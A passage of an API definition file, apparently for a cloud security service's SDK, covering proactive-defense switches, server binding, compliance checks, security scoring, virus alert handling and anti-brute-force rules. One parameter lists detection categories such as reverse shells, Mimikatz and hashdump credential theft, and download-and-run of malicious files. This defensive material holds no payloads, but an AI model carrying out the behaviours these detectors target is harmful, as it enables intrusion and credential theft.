  config: string(name='Config', description='The status of the feature. Valid values:

*   **on**: enabled
*   **off**: disabled', example='on', position='Query'),
  typeList: [ string ](name='TypeList', description='The type of the feature in proactive defense. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode] (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_71131**: Ingress service executes sequence of suspicious behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54383**: MimiKatz Credential Stealing (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound Shell (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: ransomware (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior (Windows)', position='Query'),
}

model BatchOperateCommonOverallConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='765EDBDE-1686-5DBA-B76F-2E0E6E7E1B96'),
}

model BatchOperateCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: BatchOperateCommonOverallConfigResponseBody(name='body'),
}

async function batchOperateCommonOverallConfig(request: BatchOperateCommonOverallConfigRequest): BatchOperateCommonOverallConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'BatchOperateCommonOverallConfig', 'POST', '/', 'json', false, 'json', request);
}

model BindAuthToMachineRequest {
  authVersion: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='6', position='Query'),
  autoBind?: int32(name='AutoBind', description='Specifies whether to automatically bind servers to Security Center. Valid values:

*   **0**: no
*   **1**: yes', example='1', position='Query'),
  bind?: [ string ](name='Bind', description='The UUIDs of the servers that you want to bind to Security Center.

>  You must specify at least one of the **Bind** and **UnBind** parameters.', position='Query'),
  bindAll?: boolean(name='BindAll', description='Specifies whether to bind all servers to Security Center. Default value: **false**. Valid values:

*   **true**: yes
*   **false**: no', example='true', position='Query'),
  criteria?: string(name='Criteria', description='The search conditions that are used to filter servers. The value of this parameter is in the JSON format and is case-sensitive.

>  A search condition can be an instance ID, instance name, virtual private cloud (VPC) ID, region, or public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='[{"name":"riskStatus","value":"YES"},{"name":"internetIp","value":"1.2.XX.XX"}]', position='Query'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship that you want to use to evaluate multiple search conditions. Default value: **OR**. Valid values:

*   **OR******
*   **AND******', example='OR', position='Query'),
  unBind?: [ string ](name='UnBind', description='The UUIDs of the servers that you want to unbind from Security Center.

>  You must specify at least one of the **Bind** and **UnBind** parameters.', position='Query'),
}

model BindAuthToMachineResponseBody = {
  bindCount?: int32(name='BindCount', description='The number of bound servers.', example='1'),
  insufficientCoreCount?: int32(name='InsufficientCoreCount', description='The shortage in the quota for cores of servers that can be protected.', example='1'),
  insufficientEcsCount?: int32(name='InsufficientEcsCount', description='The shortage in the quota for servers that can be protected.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='23AD0BD2-8771-5647-819E-6BA51E212F80'),
  resultCode?: int32(name='ResultCode', description='The status code that indicates the result. Valid values:

*   **0**: The servers are bound to or unbound from Security Center.
*   **1**: The values that you specified for the parameters are invalid.
*   **2**: The quota for servers that can be protected is insufficient.
*   **3**: The quota for cores of servers that can be protected is insufficient.', example='2'),
  unBindCount?: int32(name='UnBindCount', description='The number of unbound servers.', example='1'),
}

model BindAuthToMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: BindAuthToMachineResponseBody(name='body'),
}

async function bindAuthToMachine(request: BindAuthToMachineRequest): BindAuthToMachineResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'BindAuthToMachine', 'POST', '/', 'json', false, 'json', request);
}

model CancelOnceTaskRequest {
  taskId: string(name='TaskId', description='The ID of the task.

>  You can call the [GenerateOnceTask](~~GenerateOnceTask~~) operation to query the IDs of tasks.', example='ec9c0d88f36cc27765a98c554ee2****', position='Query'),
}

model CancelOnceTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
}

model CancelOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CancelOnceTaskResponseBody(name='body'),
}

async function cancelOnceTask(request: CancelOnceTaskRequest): CancelOnceTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CancelOnceTask', 'POST', '/', 'json', false, 'json', request);
}

model ChangeAssetRefreshTaskConfigRequest {
  assetRefreshConfigs?: [ 
    {
      refreshConfigType?: int32(name='RefreshConfigType'),
      schedulePeriod?: int32(name='SchedulePeriod', description='The interval at which assets are synchronized. Unit: minutes. Valid values:

*   **60**
*   **180**
*   **360**
*   **720**
*   **1440**
*   **10080**', example='360'),
      status?: int32(name='Status', description='The status of the asset synchronization feature. Valid values:

*   **1**: Asset synchronization is enabled.
*   **0**: Asset synchronization is disabled.', example='1'),
      targetId?: long(name='TargetId'),
      vendor?: int32(name='Vendor', description='The service provider of the cloud asset. Valid values:

*   **3**: Tencent Cloud
*   **4**: HUAWEI CLOUD
*   **7**: Amazon Web Services (AWS)', example='3'),
    }
  ](name='AssetRefreshConfigs', description='The asset synchronization configurations.', position='Query'),
  regionId?: string(name='RegionId', description='The region in which your Security Center service resides.', example='cn-hangzhou', position='Query'),
}

model ChangeAssetRefreshTaskConfigResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model ChangeAssetRefreshTaskConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ChangeAssetRefreshTaskConfigResponseBody(name='body'),
}

async function changeAssetRefreshTaskConfig(request: ChangeAssetRefreshTaskConfigRequest): ChangeAssetRefreshTaskConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ChangeAssetRefreshTaskConfig', 'POST', '/', 'json', false, 'json', request);
}

model ChangeCheckConfigRequest {
  addedCheck?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the ID of the check item.', example='5'),
      sectionId?: long(name='SectionId', description='The section ID of the check item.', example='69'),
    }
  ](name='AddedCheck', description='The list of check items that you want to add to the policy.

>  If the ConfigStandardIds or ConfigRequirementIds parameter is configured, this parameter does not take effect.', position='Query'),
  configRequirementIds?: {
    addIds?: [ long ](name='AddIds', description='The requirement IDs that you want to add to the policy.'),
    removeIds?: [ long ](name='RemoveIds', description='The requirement IDs that you want to remove from the policy.'),
  }(name='ConfigRequirementIds', description='The requirement IDs that you want to specify for the check policy.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the requirement ID. If the ConfigStandardIds parameter is configured, this parameter does not take effect.', shrink='json', position='Query'),
  configStandardIds?: {
    addIds?: [ long ](name='AddIds', description='The standard IDs that you want to add to the policy.'),
    removeIds?: [ long ](name='RemoveIds', description='The standard IDs that you want to remove from the policy.'),
  }(name='ConfigStandardIds', description='The standard IDs that you want to specify for the check policy.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the standard ID.', shrink='json', position='Query'),
  configure?: string(name='Configure', description='The configuration of the check item. Valid values:
- **all**', example='all', position='Query'),
  cycleDays?: [ int32 ](name='CycleDays', description='The days in a week on which a check is performed.', position='Query'),
  enableAddCheck?: boolean(name='EnableAddCheck', description='Specifies whether to check the new check items in the selected requirement item. Valid values:
- **true**
- **false**', example='false', position='Query'),
  enableAutoCheck?: boolean(name='EnableAutoCheck', description='Specifies whether to enable the automatic periodical check feature. Valid values:

- **true**
- **false**', example='true', position='Query'),
  endTime?: int32(name='EndTime', description='The end time of the check. The value specifies a point in time in a day. The time period that is specified by the start time and end time must be one of the following time periods:

*   **00:00 to 06:00:** If you set the StartTime parameter to 0, you must set the EndTime parameter to 6.
*   **06:00 to 12:00**: If you set the StartTime parameter to 6, you must set the EndTime parameter to 12.
*   **12:00 to 18:00**: If you set the StartTime parameter to 12, you must set the EndTime parameter to 18.
*  **18:00 to 24:00:** If you set the StartTime parameter to 18, you must set the EndTime parameter to 24.', example='6', position='Query'),
  regionId?: string(name='RegionId', description='The region ID of the bastion host to query.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-hangzhou', position='Query'),
  removedCheck?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the ID of the check item.', example='19'),
      sectionId?: long(name='SectionId', description='The section ID of the check item.', example='69'),
    }
  ](name='RemovedCheck', description='The list of the check items that you want to remove from the policy.

>  If the ConfigStandardIds or ConfigRequirementIds parameter is configured, this parameter does not take effect.', position='Query'),
  standardIds?: [ long ](name='StandardIds', description='An array that consists of the information about the check item.', position='Query'),
  startTime?: int32(name='StartTime', description='The start time of the check. The value specifies a point in time in a day.', example='0', position='Query'),
  vendors?: [ string ](name='Vendors', description='The service provider (SP) of the cloud asset.', position='Query'),
}

model ChangeCheckConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6EBB8614-746D-555D-AB69-C801AEC7DCE0'),
}

model ChangeCheckConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ChangeCheckConfigResponseBody(name='body'),
}

async function changeCheckConfig(request: ChangeCheckConfigRequest): ChangeCheckConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ChangeCheckConfig', 'POST', '/', 'json', false, 'json', request);
}

model ChangeCheckCustomConfigRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

> You can call the [ListCheckResult](~~ListCheckResult~~) operation to query the IDs of check items.', example='76', position='Query'),
  customConfigs?: [ 
    {
      name?: string(name='Name', description='The name of the custom configuration item. The name of a custom configuration item is unique in a check item.', example='SessionTimeMax'),
      operation?: string(name='Operation', description='The operation that you want to perform on the custom configuration item. This parameter is required only if you want to delete the custom configuration item. To delete the custom configuration item, set the value to DELETE.', example='DELETE'),
      value?: string(name='Value', description='The value of the custom configuration item. The value is a string.', example='13'),
    }
  ](name='CustomConfigs', description='The custom configuration items of the check item.', position='Query'),
  regionId?: string(name='RegionId', description='The region where the Security Center instance is deployed. Valid values:

*   **cn-hangzhou**: International
*   **ap-southeast-1**: Singapore', example='cn-hangzhou', position='Query'),
}

model ChangeCheckCustomConfigResponseBody = {
  illegalCustomConfigs?: [ 
    {
      name?: string(name='Name', description='The name of the custom configuration item. The name of a custom configuration item is unique in a check item.', example='SessionTimeMax'),
    }
  ](name='IllegalCustomConfigs', description='An array that consists of the invalid custom configuration items of the check item.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DA8133CC-CCA0-5CF2-BF64-FE7D52C44***'),
}

model ChangeCheckCustomConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ChangeCheckCustomConfigResponseBody(name='body'),
}

async function changeCheckCustomConfig(request: ChangeCheckCustomConfigRequest): ChangeCheckCustomConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ChangeCheckCustomConfig', 'POST', '/', 'json', false, 'json', request);
}

model ChangeSecurityScoreRuleRequest {
  resetSecurityScoreRule?: boolean(name='ResetSecurityScoreRule', description='Specifies whether to reset to the system default rule. Valid values:

*   true: yes
*   false: no', example='false', position='Query'),
  securityScoreRuleList?: [ 
    {
      ruleType?: string(name='RuleType', description='The deducted module that is supported by the security score feature. Valid values:

*   SS_REINFORCE: issue in key feature configuration
*   SS_ALARM: unhandled alert
*   SS_VUL: unfixed vulnerability
*   SS_HC: baseline risk
*   SS_CLOUD_HC: Cloud platform configuration check item problem.
*   SS_AK: risk of AccessKey pair leaks', example='SS_ALARM'),
      score?: int32(name='Score', description='The deduction threshold of the deduction module.

>  Valid values: 0 to 100. The sum of the deduction thresholds for all deduction modules must be equal to 100.', example='5', minimum=0, maximum=100),
      securityScoreItemList?: [ 
        {
          score?: int32(name='Score', description='The penalty point of the deduction item.', example='5'),
          scoreThreshold?: int32(name='ScoreThreshold', description='The threshold for the deduction item.

>  Valid values: 0 to the deduction threshold of the deduction module.', example='10', minimum=0, maximum=100),
          subRuleType?: string(name='SubRuleType', description='The deduction item of the deduction module. The following list describes the deduction modules and their deduction items:

*   SS_REINFORCE: issue in key feature configuration

    *   XPRESS_INSTALL: Security Center is not authorized.
    *   REINFORCE_SUSPICIOUS: The anti-virus feature is disabled.
    *   RANSOMWARE: The anti-ransomware policy is disabled.
    *   WEB_LOCK: The web tamper proofing feature is disabled.
    *   VIRUS_SCHEDULE_SCAN: The periodic virus scan policy is disabled.
    *   IMAGE_REPO_SCAN: The container image scan range is not configured.
    *   IMAGE_SCAN_TASK: The feature of one-click scan of container images for security risks is not performed.

*   SS_ALARM: unhandled alert

    *   ALARM_SERIOUS: An unhandled high-risk alert event is detected.
    *   ALARM_SUSPICIOUS: An unhandled medium-risk alarm event is detected.
    *   ALARM_REMIND: An unhandled low-risk alarm event is detected.

*   SS_VUL: unfixed vulnerability

    *   CMS_UNFIX: An unfixed Web-CMS vulnerability is detected.
    *   WIN_UNFIX: An unfixed Windows host vulnerability is detected.
    *   CVE_UNFIX: An unfixed Linux host vulnerability is detected.
    *   ERM_UNFIX: An unfixed emergency vulnerability is detected.
    *   ERM_UNCHECK: An undetected emergency vulnerability exists.

*   SS_HC: baseline risks

    *   WEAK_EXPLOIT: Weak passwords are exposed to the Internet.
    *   WEAK_PASSWORD: Weak passwords exist.
    *   HC_EXPLOIT: The data source may be hacked.
    *   HC_OTHER_WARNING: Security configuration risks exist.

*   SS_CLOUD_HC: Cloud platform configuration check item problem.

    *   CSPM_CIEM_NOT_PASS: A CIEM check item failed the check.
    *   CSPM_RISK_NOT_PASS: A security risk check item failed the check.
    *   CSPM_COMPLIANCE_NOT_PASS: A compliance check item failed the check.

*   SS_AK: risk of AccessKey pair leaks', example='ALARM_SERIOUS'),
        }
      ](name='SecurityScoreItemList', description='The deduction items of the deduction module.'),
    }
  ](name='SecurityScoreRuleList', description='The list of deducted modules that are supported by the security score feature.', position='Query'),
}

model ChangeSecurityScoreRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='23AD0BD2-8771-5647-819E-6BA51E21****'),
}

model ChangeSecurityScoreRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ChangeSecurityScoreRuleResponseBody(name='body'),
}

async function changeSecurityScoreRule(request: ChangeSecurityScoreRuleRequest): ChangeSecurityScoreRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ChangeSecurityScoreRule', 'POST', '/', 'json', false, 'json', request);
}

model ChangeUserLangRequest {
  userLang?: string(name='UserLang', description='The new language. Valid values:

*   zh: Chinese
*   en: English', example='zh', position='Query'),
}

model ChangeUserLangResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='2F5AA940-9EBF-5948-ACE7-3EF0FE54****'),
}

model ChangeUserLangResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ChangeUserLangResponseBody(name='body'),
}

async function changeUserLang(request: ChangeUserLangRequest): ChangeUserLangResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ChangeUserLang', 'POST', '/', 'json', false, 'json', request);
}

model CheckQuaraFileIdRequest {
  quaraFileIds: [ string ](name='QuaraFileIds', description='The IDs of quarantined files that you want to check.

>  You can call the [DescribeSuspEventQuaraFiles](~~DescribeSuspEventQuaraFiles~~) operation to query the IDs of quarantined files.', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server on which you want to check quarantined files.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='4fe8e1cd-3c37-4851-b9de-124da32c****', position='Query'),
}

model CheckQuaraFileIdResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the ID of the quarantined file is valid. Valid values:

*   **true**: The ID of the quarantined file is valid.
*   **false**: The ID of the quarantined file is invalid.', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model CheckQuaraFileIdResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckQuaraFileIdResponseBody(name='body'),
}

async function checkQuaraFileId(request: CheckQuaraFileIdRequest): CheckQuaraFileIdResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CheckQuaraFileId', 'POST', '/', 'json', false, 'json', request);
}

model CheckSecurityEventIdRequest {
  securityEventIds?: [ string ](name='SecurityEventIds', description='The IDs of alert events. You can specify up to 100 IDs. If you do not specify this parameter, the value of the response parameter **Data** is **false**. The value false indicates that no alert events are generated on the server.

> You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the IDs of alert events.', example='["1234567","98765432"]', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='96ad2473-bc60-45ba-ad1c-932e2866****', position='Query'),
}

model CheckSecurityEventIdResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the alert events are generated on the server. Valid values:

*   **true**
*   **false**: no', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1383B0DB-D5D6-4B0C-9E6B-75939C8E67FE'),
}

model CheckSecurityEventIdResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckSecurityEventIdResponseBody(name='body'),
}

async function checkSecurityEventId(request: CheckSecurityEventIdRequest): CheckSecurityEventIdResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CheckSecurityEventId', 'POST', '/', 'json', false, 'json', request);
}

model CheckUserHasEcsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model CheckUserHasEcsResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request is successful. Other status codes indicate that the request fails. You can identify the cause of the failure based on the status code.', example='200'),
  data?: boolean(name='Data', description='Indicates whether ECS instances exist. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  success?: boolean(name='Success', description='The status of the request. Valid values:

*   **true**: The request is successful.
*   **false**: The request fails.', example='true'),
}

model CheckUserHasEcsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckUserHasEcsResponseBody(name='body'),
}

async function checkUserHasEcs(request: CheckUserHasEcsRequest): CheckUserHasEcsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CheckUserHasEcs', 'POST', '/', 'json', false, 'json', request);
}

model ConfirmVirusEventsRequest {
  operationAll: int32(name='OperationAll', description='Specifies whether to handle all alert events. Valid values:

*   **1**: yes
*   **0**: no', example='0', position='Query'),
  operationCode: string(name='OperationCode', description='The operation that you want to perform on the alert events. Valid values:

*   **default**: performs in-depth detection and removal
*   **ignore**: ignores the alert event
*   **advance\\_mark\\_mis_info**: adds the alert events to the whitelist
*   **manual_handled**: marks the alert events as manually handled', example='default', position='Query'),
  operationRange?: string(name='OperationRange', description='The server on which you want to perform the alert events.', example='[{\\"type\\":\\"machine\\",\\"list\\":[\\"3aedba3d-bd4d-4dfb-bb0d-xxxxxxxxxxxx\\"]}]', position='Query'),
}

model ConfirmVirusEventsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='5DFD6277-CC36-57F7-ACE6-F5952XXXXXXXX'),
  result?: boolean(name='Result', description='Indicates whether the request was successful. Valid values:

*   true: The request was successful.
*   false: The request failed.', example='true'),
}

model ConfirmVirusEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ConfirmVirusEventsResponseBody(name='body'),
}

async function confirmVirusEvents(request: ConfirmVirusEventsRequest): ConfirmVirusEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ConfirmVirusEvents', 'POST', '/', 'json', false, 'json', request);
}

model CreateAgentlessScanTaskRequest {
  autoDeleteDays?: int32(name='AutoDeleteDays', description='The retention period of images. Unit: days.', example='1', position='Query'),
  releaseAfterScan?: boolean(name='ReleaseAfterScan', description='Specifies whether to enable the cost-saving mode. Valid values:

*   **true**
*   **false**', example='true', position='Query'),
  scanDataDisk?: boolean(name='ScanDataDisk', description='Specifies whether to check data disks. Valid values:

*   **true**
*   **false**', example='true', position='Query'),
  targetType?: int32(name='TargetType', description='The type of the detection object. Valid values:

*   **2**: image', example='2', position='Query'),
  uuidList: [ string ](name='UuidList', description='The UUIDs of the assets on which you want to run the detection task.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', position='Query'),
}

model CreateAgentlessScanTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='E90DE229-9FC6-58F6-BF4B-03AD6179****'),
}

model CreateAgentlessScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateAgentlessScanTaskResponseBody(name='body'),
}

async function createAgentlessScanTask(request: CreateAgentlessScanTaskRequest): CreateAgentlessScanTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateAgentlessScanTask', 'POST', '/', 'json', false, 'json', request);
}

model CreateAntiBruteForceRuleRequest {
  defaultRule?: boolean(name='DefaultRule', description='Specifies whether to set the defense rule as the default rule. Valid values:

*   **true**: yes
*   **false**: no

>  If no defense rule is created for a server, the default rule is applied to the server.', example='true', position='Query'),
  failCount: int32(name='FailCount', description='The maximum number of failed logon attempts from an account. Valid values: 2, 3, 4, 5, 10, 50, 80, and 100.', example='2', position='Query'),
  forbiddenTime: int32(name='ForbiddenTime', description='The period of time during which logons from an account are not allowed. Unit: minutes. Valid values:

*   **5**: 5 minutes
*   **15**: 15 minutes
*   **30**: 30 minutes
*   **60**: 1 hour
*   **120**: 2 hours
*   **360**: 6 hours
*   **720**: 12 hours
*   **1440**: 24 hours
*   **10080**: 7 days
*   **52560000**: permanent', example='5', position='Query'),
  name: string(name='Name', description='The name of the defense rule.', example='TestAntiBruteForceRule', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
  span: int32(name='Span', description='The maximum period of time during which failed logon attempts from an account can occur. Unit: minutes. Valid values:

*   **1**
*   **2**
*   **5**
*   **10**
*   **15**

>  To configure a defense rule, you must specify the Span, FailCount, and ForbiddenTime parameters. If the number of failed logon attempts from an account within the minutes specified by Span exceeds the value specified by FailCount, the account cannot be used for logons within the minutes specified by ForbiddenTime.', example='1', position='Query'),
  uuidList: [ string ](name='UuidList', description='The UUIDs of the servers to which you want to apply the defense rule.', position='Query'),
}

model CreateAntiBruteForceRuleResponseBody = {
  createAntiBruteForceRule?: {
    ruleId?: long(name='RuleId', description='The ID of the defense rule.', example='65778'),
  }(name='CreateAntiBruteForceRule', description='The information about the defense rule.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model CreateAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateAntiBruteForceRuleResponseBody(name='body'),
}

